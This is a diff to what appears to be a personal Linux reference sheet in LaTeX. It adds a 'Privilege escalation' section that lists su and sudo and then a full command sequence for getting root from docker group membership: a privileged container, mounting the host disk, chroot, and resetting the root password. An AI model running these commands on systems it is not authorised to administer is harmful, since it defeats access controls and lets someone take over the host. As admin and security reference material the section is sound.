@@ -353,6 +353,32 @@
 
 \newpage
 
+\section{Privilege escalation}
+
+\subsection{becoming root on Linux/UNIX}
+
+\begin{ldesc}
+	\li[using \C{su}  ] \$ su ~~~~~~~~~~~~~ \# needs pw
+	\li[using \C{sudo}] \$ sudo su ~~~~~~~~ \# may need pw
+	\li[using docker]
+		user@host\$ groups ~\# needs docker group\li
+		...~docker~... \li
+		user@host\$ mount | grep " / " \li
+		/dev/sdXX on / type ... \li
+		user@host\$ docker pull \I{image} \li
+		user@host\$ docker run -{-}privileged -ti \I{image} \li
+		root@container\$ mount /dev/sdXX /mnt \li
+		root@container\$ chroot /mnt /bin/bash \li
+		root@chroot\$ passwd \li
+		New password: \li
+		root@chroot\$ exit \li
+		root@container\$ exit \li
+		user@host\$ su \li
+		Password: \li
+		root@host\$ \li
+\end{ldesc}
+
+
 \section{Stuff to install \hfill {\normalsize (Arch Linux)}}
 
 % TODO: Also add ubuntu package names?
